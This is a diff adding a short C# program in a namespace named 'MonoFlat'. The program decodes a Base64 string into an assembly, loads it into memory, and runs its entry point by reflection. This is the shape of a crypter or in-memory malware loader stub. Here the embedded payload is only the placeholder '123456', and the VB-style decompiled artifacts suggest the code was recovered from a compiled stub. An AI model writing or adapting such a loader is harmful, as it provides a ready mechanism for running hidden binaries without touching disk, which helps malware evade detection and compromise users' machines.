@@ -1,0 +1,30 @@
+﻿using System;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using Microsoft.VisualBasic.CompilerServices;
+
+namespace MonoFlat
+{
+	[StandardModule]
+	public sealed class Module1
+	{
+		public static void Main()
+		{
+			string s = "123456";
+			byte[] rawAssembly = Convert.FromBase64String(s);
+			Assembly assembly = AppDomain.CurrentDomain.Load(rawAssembly);
+			MethodInfo entryPoint = assembly.EntryPoint;
+			object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
+			object[] parameters = null;
+			bool flag = entryPoint.GetParameters().Length > 0;
+			if (flag)
+			{
+				parameters = new object[]
+				{
+					new string[1]
+				};
+			}
+			entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), parameters);
+		}
+	}
+}
